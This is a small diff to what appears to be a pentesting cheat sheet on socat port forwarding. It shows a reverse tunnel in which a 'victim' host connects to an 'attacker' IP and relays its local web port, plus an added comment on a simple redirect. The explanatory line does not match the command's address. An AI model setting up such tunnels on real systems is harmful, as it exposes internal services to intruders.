@@ -12,7 +12,9 @@ From server (attacker): socat -v TCP4-LISTEN:10000 TCP4-LISTEN:8080
 From client (victim): socat TCP4:172.16.185.1:10000 TCP4:localhost:80
 
 or simply 
-socat TCP-LISTEN:80,fork TCP:127.0.0.1:80
+socat TCP-LISTEN:80,fork TCP:127.0.0.1:80 #redirect on current IP
+#change 127.0.0.1 to any remote ip if the target is not the current machine
+
 (This is to redirect all port 80 conenctions to ip 202.54.1.5)
 
 
